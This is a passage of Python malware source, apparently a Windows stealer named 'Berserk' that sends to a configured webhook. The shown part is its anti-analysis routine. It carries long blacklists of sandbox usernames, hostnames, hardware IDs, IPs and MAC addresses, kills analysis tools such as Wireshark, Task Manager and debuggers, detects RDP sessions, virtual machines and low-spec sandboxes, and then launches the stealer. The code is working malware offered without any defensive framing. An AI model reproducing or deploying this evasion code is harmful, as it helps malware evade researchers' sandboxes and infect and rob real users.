            'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P',
            'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
        self.blackListedHWIDS = [
            '7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555',
            '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A',
            '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121',
            '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7',
            '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE',
            'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3',
            'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF',
            '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0',
            '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4',
            'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8',
            '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250',
            '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E',
            '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3',
            'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026',
            'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85',
            'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D',
            'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518',
            '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009',
            'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9',
            '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE',
            '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972',
            '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE',
            'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173',
            'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C',
            'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57',
            '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2',
            'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5',
            '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F',
            'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00',
            '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57',
            'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08',
            'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661',
            '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
        self.blackListedIPS = [
            '88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116',
            '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151',
            '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50',
            '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143',
            '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97',
            '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167',
            '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']
        self.blackListedMacs = [
            '00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de',
            '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40',
            '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01',
            '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3',
            '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1',
            '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de',
            'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02',
            '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3',
            '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77',
            '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d',
            '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e',
            '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8',
            '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20',
            '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7',
            '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de',
            '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33',
            '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06',
            '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d',
            '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
        self.blacklistedProcesses = [
            "httpdebuggerui", "wireshark", "fiddler", "charles", "httptoolkit", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64",
            "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga",
            "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]

        self.check_process()
        if self.get_network():
            debugging = True
        if self.get_system():
            debugging = True
        if self.registry_check():
            debugging = True
        if self.dll_check():
            debugging = True
        if self.specs_check():
            debugging = True
        if self.rdp_check():
            debugging = True
        return debugging

    def rdp_check(self) -> bool:
        """Detect if running in a Remote Desktop (RDP) session."""
        try:
            if ctypes.windll.user32.GetSystemMetrics(0x1000) != 0:  # SM_REMOTESESSION
                return True
            session_name = os.getenv("SESSIONNAME", "")
            if session_name and "RDP" in session_name.upper():
                return True
        except Exception:
            pass
        return False

    def registry_check(self) -> bool:
        """VM detection via Windows registry (GPU driver, Disk Enum VMware/VBOX)."""
        try:
            reg1 = subprocess.run(
                r"REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000\DriverDesc 2> nul",
                shell=True, capture_output=True, creationflags=0x08000000
            )
            reg2 = subprocess.run(
                r"REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000\ProviderName 2> nul",
                shell=True, capture_output=True, creationflags=0x08000000
            )
            if reg1.returncode != 1 and reg2.returncode != 1:
                return True
            handle = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Disk\Enum"
            )
            try:
                reg_val = winreg.QueryValueEx(handle, "0")[0]
                if reg_val and ("VMware" in reg_val or "VBOX" in reg_val):
                    return True
            finally:
                winreg.CloseKey(handle)
        except Exception:
            pass
        return False

    def dll_check(self) -> bool:
        """VM detection via VMware/VirtualBox DLLs."""
        try:
            system_root = os.environ.get("SystemRoot", "C:\\Windows")
            vmware_dll = os.path.join(system_root, "System32", "vmGuestLib.dll")
            vbox_dll = os.path.join(system_root, "vboxmrxnp.dll")
            if os.path.exists(vmware_dll) or os.path.exists(vbox_dll):
                return True
        except Exception:
            pass
        return False

    def specs_check(self) -> bool:
        """Sandbox detection: low RAM, small disk or single CPU."""
        try:
            ram_gb = psutil.virtual_memory()[0] / (1024 ** 3)
            disk_gb = psutil.disk_usage("C:\\")[0] / (1024 ** 3)
            cpu_count = psutil.cpu_count() or 1
            if ram_gb <= 2 or disk_gb <= 50 or cpu_count <= 1:
                return True
        except Exception:
            pass
        return False

    def check_process(self) -> bool:
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in self.blacklistedProcesses):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        if sys.gettrace():
            sys.exit(0)

    def get_network(self) -> bool:
        try:
            ip = requests.get('https://api.ipify.org', timeout=REQUEST_TIMEOUT).text.strip()
        except Exception:
            return False
        try:
            interface, addrs = next(iter(psutil.net_if_addrs().items()))
            mac = (addrs[0].address if addrs else "") or ""
        except (StopIteration, IndexError, AttributeError):
            mac = ""
        if ip in self.blackListedIPS:
            return True
        if mac in self.blackListedMacs:
            return True
        return False

    def get_system(self) -> bool:
        username = os.getenv("UserName") or ""
        hostname = os.getenv("COMPUTERNAME") or ""
        hwid = ""
        try:
            r = subprocess.run(
                "wmic csproduct get uuid",
                shell=True, capture_output=True, timeout=10, creationflags=0x08000000
            )
            out = (r.stdout or b"").decode(errors="ignore").strip()
            for line in out.splitlines():
                line = line.strip()
                if line and line.lower() != "uuid" and len(line) > 30 and "-" in line:
                    hwid = line
                    break
        except Exception:
            pass
        if hwid and hwid in self.blackListedHWIDS:
            return True
        if username in self.blackListedUsers:
            return True
        if hostname in self.blackListedPCNames:
            return True
        return False

    def self_destruct(self) -> None:
        sys.exit(0)


if __name__ == '__main__' and os.name == "nt":
    try:
        Berserk(__CONFIG__["webhook"])
    except Exception as err:
        try:
            ctypes.windll.user32.MessageBoxW(
                None,
                str(err)[:500],
                "Error",
                0x10,
            )
        except Exception:
            pass
        raise